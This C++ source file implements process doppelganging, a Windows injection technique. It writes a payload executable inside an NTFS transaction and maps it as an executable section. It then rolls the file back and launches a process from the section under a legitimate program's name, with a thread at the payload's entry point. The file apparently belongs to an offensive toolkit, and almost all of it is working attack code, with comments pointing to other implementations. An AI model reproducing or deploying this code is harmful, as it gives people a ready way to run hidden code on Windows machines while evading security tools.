#include <cstdio>
#include <string>

#include "common.h"
#include "modules.h"
#include "unique_memory.h"
#include "logging.h"

#include "sysapi.h"
#include "apiset.h"

#pragma comment(lib, "ntdll.lib")

#include <iostream>

namespace modules {

bool inject_create_process_doppel(const std::wstring& original_image, const std::wstring& injected_image, RemoteProcessMemoryMethod method) {

    bblog::info("[*] Preparing the injected image");
    bblog::info("opening image...");

    sysapi::unique_handle ImageHandle = sysapi::FileOpen(injected_image.c_str());
    if (ImageHandle == NULL) {
        return false;
    }

    bblog::info("getting image file size...");

    size_t FileSize = sysapi::FileGetSize(ImageHandle.get());
    if (FileSize == NULL) {
        return false;
    }

    bblog::info("mapping image file...");

    auto ImageFileSection = sysapi::SectionFileCreate(ImageHandle.get(), SECTION_MAP_READ, PAGE_READONLY);
    if (ImageFileSection == NULL) {
        return false;
    }

    // TODO: RAII
    auto *ImageFileBuffer = sysapi::SectionMapView(ImageFileSection, FileSize, PAGE_READONLY);
    if (ImageFileBuffer == NULL) {
        return false;
    }

    sysapi::unique_handle TransactionHandle = sysapi::TransactionCreate(L"TH");
    if (TransactionHandle == NULL) {
        return false;
    }

    std::wstring TempModulePath = {
        sysapi::GetPeb()->ProcessParameters->CurrentDirectory.DosPath.Buffer,
        sysapi::GetPeb()->ProcessParameters->CurrentDirectory.DosPath.Length / sizeof(wchar_t)
    };

    std::wstring ModuleName = original_image;
    ModuleName.erase(0, ModuleName.find_last_of(L'\\') + 1);

    TempModulePath += ModuleName;

    sysapi::TransactionSet(TransactionHandle.get());

    sysapi::unique_handle ModuleHandle = sysapi::FileCreate(TempModulePath.c_str(), FILE_GENERIC_READ | FILE_GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0);

    sysapi::TransactionSet(0);

    if (ModuleHandle == nullptr) {
        return false;
    }

    auto res = sysapi::FileWrite(ModuleHandle.get(), ImageFileBuffer, FileSize);

    ModuleHandle.reset();

    if (!res) {
        return false;
    }

    sysapi::TransactionSet(TransactionHandle.get());

    ModuleHandle = sysapi::FileOpen(TempModulePath.c_str());

    sysapi::TransactionSet(0);

    if (ModuleHandle == nullptr) {
        return false;
    }

    sysapi::unique_handle ModuleFileSection = sysapi::SectionFileCreate(ModuleHandle.get(), SECTION_MAP_EXECUTE, PAGE_READONLY, true);

    ModuleHandle.reset();

    if (ModuleFileSection == NULL) {
        return false;
    }

    res = sysapi::TransactionRollback(TransactionHandle.get());
    if (!res) {
        return false;
    }

    TransactionHandle.reset();

    bblog::info("[*] Preparing a new process");

    bblog::info("creating process...");

    sysapi::process_t process;

    process.hProcess = sysapi::ProcessCreate(ModuleFileSection.get());
    if (process.hProcess == NULL) {
        return false;
    }

    bblog::info("getting process PEB address...");

    PROCESS_BASIC_INFORMATION BasicInfo;
    res = sysapi::ProcessGetBasicInfo(process.hProcess.get(), BasicInfo);
    if (!res) {
        return false;
    }

    unique_c_mem<PEB> process_peb;
    if (!process_peb.allocate()) {
        return false;
    }

    bblog::info("reading process PEB at 0x{:x}...", (uintptr_t)BasicInfo.PebBaseAddress);

    size_t read = sysapi::VirtualMemoryRead(process_peb.data(), sizeof(PEB), BasicInfo.PebBaseAddress, process.hProcess.get());
    if (read == 0) {
        return false;
    }

    auto proc_params = sysapi::ProcessParametersCreate(original_image);
    if (proc_params == nullptr) {
        return false;
    }

    res = process_write_params(process.hProcess.get(), proc_params, BasicInfo.PebBaseAddress, method);

    sysapi::ProcessParametersDestroy(proc_params);

    if (!res) {
        return false;
    }

    auto *pDOSHeader = (PIMAGE_DOS_HEADER)ImageFileBuffer;
    auto *pNT32Header = (PIMAGE_NT_HEADERS32)PTR_ADD(ImageFileBuffer, pDOSHeader->e_lfanew);
    auto *pNT64Header = (PIMAGE_NT_HEADERS64)pNT32Header;

    // TODO: we need to notify CSRSS about the new process to perform extra routines
    // such as creating ActivationContext, otherwise some DLLs will not load properly
    // i.e. GdiPlus.dll
    // also the hasherezade's doppel implementation doesn't have it
    //
    // https://www.coresecurity.com/core-labs/articles/creating-processes-using-system-calls
    // https://medium.com/cybereason/activation-contexts-a-love-story-9666d5b1e03
    // https://github.com/fortra/CreateProcess
    // https://github.com/deroko/activationcontext
    // https://github.com/reactos/reactos/blob/master/sdk/include/reactos/subsys/win/basemsg.h
    // https://github.com/reactos/reactos/tree/master/sdk/include/reactos/subsys/csr

    process.hThread = sysapi::ThreadCreate(process.hProcess.get(), PTR_ADD(process_peb->ImageBaseAddress, pNT64Header->OptionalHeader.AddressOfEntryPoint));
    if (process.hThread == NULL) {
        return false;
    }

    bblog::info("[+] Success");
    return true;
}

} // namespace modules
